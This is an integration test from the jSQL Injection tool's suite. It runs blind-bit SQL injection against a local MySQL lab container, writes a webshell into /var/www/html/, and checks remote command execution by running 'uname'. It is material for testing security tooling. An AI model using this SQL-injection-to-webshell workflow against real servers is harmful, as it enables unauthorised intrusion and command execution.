package com.test.vendor.mysql;

import com.jsql.model.InjectionModel;
import com.jsql.model.accessible.ExploitMode;
import com.jsql.model.exception.JSqlException;
import com.jsql.view.terminal.SystemOutTerminal;
import org.apache.commons.lang3.StringUtils;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Assertions;
import org.junitpioneer.jupiter.RetryingTest;

import java.util.UUID;

class MySqlExploitBlindBitSuiteIT extends ConcreteMySqlSuiteIT {
    
    @Override
    public void setupInjection() throws Exception {
        InjectionModel model = new InjectionModel();
        this.injectionModel = model;

        model.subscribe(new SystemOutTerminal());

        model.getMediatorUtils().getParameterUtil().initQueryString(
            "http://jsql-lamp:8079/php/get-mysqli.php?id=1"
        );

        model.setIsScanning(true);

        model
        .getMediatorUtils()
        .getConnectionUtil()
        .withMethodInjection(model.getMediatorMethod().getQuery())
        .withTypeRequest("GET");

        model
        .getMediatorUtils()
        .getPreferencesUtil()
        .withIsNotSearchingCharInsertion(true)  // required, must find 'true AND false' to write webshell body with union
        .withIsStrategyBlindBinDisabled(true)
        .withIsStrategyTimeDisabled(true)
        .withIsStrategyStackDisabled(true)
        .withIsStrategyMultibitDisabled(true)
        .withIsStrategyErrorDisabled(true)
        .withIsStrategyUnionDisabled(true);

        model.beginInjection();
    }

    @RetryingTest(3)
    public void exploitWebQueryBody() throws JSqlException {
        var urlSuccess = this.injectionModel.getResourceAccess().getExploitMysql().createWeb("/var/www/html/", StringUtils.EMPTY, null, ExploitMode.QUERY_BODY);
        String resultCommand = this.injectionModel.getResourceAccess().runWebShell(
            "uname",
            UUID.randomUUID(),
            urlSuccess
        );
        LOGGER.info("web: found {}, to find {}", resultCommand.trim(), "Linux");
        Assertions.assertEquals("Linux", resultCommand.trim());
    }

    @AfterEach
    void afterEach() {
        Assertions.assertEquals(
            this.injectionModel.getMediatorStrategy().getBlindBit(),
            this.injectionModel.getMediatorStrategy().getStrategy()
        );
    }
}
